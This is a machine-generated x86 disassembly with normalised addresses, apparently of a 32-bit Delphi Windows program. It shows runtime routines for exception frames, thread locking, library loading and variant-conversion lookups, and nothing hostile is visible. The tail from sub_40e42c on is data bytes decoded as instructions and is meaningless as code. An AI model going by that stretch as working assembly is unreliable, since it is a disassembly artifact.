jmp r-xdata
sub_40cf94
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d024
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b1c8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d02b
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_40d07c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4089cc
mov [ rw-data ] eax
sub_40d100
push ebx
push esi
push edi
push ebp
call sub_403674
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026ec
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403298
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_40d168
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d150
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d1f0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407ea8
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d0f0
mov [ ebp ] eax
sub_40d1f0
push ebx
mov ebx eax
mov eax ebx
call sub_40d150
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d0f0
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d230
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40d2a4
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_40d330
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4032a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_40d330
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d2ec
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d168
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d0f8
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d0d8
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d0f8
test eax eax
je r-xdata
mov eax edi
call sub_40d2ec
test bl bl
je r-xdata
mov eax edi
call sub_40d320
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d0d8
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d0e4
sub_40d3cc
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d168
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d0f8
mov eax ebx
call sub_40d304
mov eax ebx
call sub_40d2f8
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d1e0
sub_40d41c
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d168
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d310
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d0e4
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d0d8
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d310
mov eax esi
call sub_40d304
sub_40d488
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d168
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d1e0
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d0d8
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d304
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d304
sub_40d500
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d524
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d59b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_40335c
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5a2
lea eax [ ebp - 0x4 ]
call sub_405934
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_40335c
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d500
test al al
jne r-xdata
mov al 0x1
sub_40d5bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d62e
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d610
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4044f8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d617
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40da90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40daf8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daff
retn
mov eax r-xdata
call sub_403de4
mov eax r-xdata
call sub_403e0c
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c08c
call sub_40c190
call sub_40d07c
call sub_40cae0
mov eax rw-data
mov edx r-xdata
call sub_40408c
sub_40db30
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40db84
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dbde
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40840c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbe5
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40dbf0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc4a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4098f0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc51
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40dc5c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dcb6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4098c4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcbd
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40dcc8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd22
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b13c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd29
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40dd34
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd8e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40991c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd95
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40dda0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40de0d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408518
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de14
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_40de20
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de80
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409878
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404890
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de87
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40de90
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40def0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a8c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404890
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40def7
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40df00
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40df64
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4085b4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404890
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df6b
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40df94
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dfc0
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40db30
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db60
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db60
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db78
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db84
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbf0
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc5c
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dcc8
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd34
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dda0
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de20
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df00
mov eax r-xdata
call sub_40df94
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e2cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e2f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e2f8
retn
sub_40e42c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
in al 0x40
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x16004032 ] bl
add [ eax ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
jo r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
jb r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x15004032 ] bl
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
jbe r-xdata
popad
outsb
je r-xdata
inc ecx
jb r-xdata
add [ eax + 0x15004032 ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
jns r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x17004032 ] bl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e5 ] ah
inc ebp
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x17004032 ] bl
inc ebp
push esi
popad
jb r-xdata
outsb
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
inc ebp
push esi
popad
jb r-xdata
xor al [ eax ]
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
pop ss
jbe r-xdata
outsd
jb r-xdata
inc ebp
jb r-xdata
mov al [ 0x40e5 ]
add [ eax ] al
popad
jae r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe6
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0xfffbf86 ] bl
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc0040e5 ]
outsd
jb r-xdata
popad
jb r-xdata
fsub st4
inc eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x18004032 ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
out 0x40 al
add [ eax ] al
jb r-xdata
add [ eax ] al
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0040e6
add [ eax ] al
add [ eax - 0xfffbf86 ] bl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1a ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
shl [ eax + 0x40e5 ] 0x0
add [ eax ] al
add [ eax ] al
sar [ 0x40 ] 0x0
jb r-xdata
popad
outsb
je r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xe7
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x15004032 ] bl
inc ebp
push esi
popad
jb r-xdata
add [ 0x35040040 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dh
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
add al dh
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc0040 ] bh
add [ eax ] al
cwde
jpe r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub st4
inc eax
add [ eax ] al
lea eax [ eax ]
je r-xdata
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
jb r-xdata
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
jb r-xdata
add [ eax ] al
add al dh
xor al 0x40
ror ah 0xe6
inc eax
add [ eax ] al
popad
jns r-xdata
inc eax
add al bh
xor al 0x40
add [ 0x35040040 ] dh
popad
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
cwde
jpe r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x40 ] dh
je r-xdata
popad
inc eax
add [ eax ] al
call sub_40e7fa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc eax
add [ eax + eax ] cl
popad
outsb
je r-xdata
jb r-xdata
popad
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add al dh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x18004032 ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
test al 0xe3
inc eax
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
push esi
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
pop ss
dec bp
insd
outsd
jb r-xdata
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
cwde
xor al [ eax ]
sbb [ ebp + 0x56 ] al
outsd
add [ eax ] al
popad
jb r-xdata
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x14004032 ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ esi + 0x34f80040 ] al
inc eax
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0040 ] bl
outsd
jb r-xdata
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
call 0x4ce8e6
add [ eax ] al
cwde
jpe r-xdata
inc ebp
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x18004032 ] bl
inc ebp
push esi
inc eax
insd
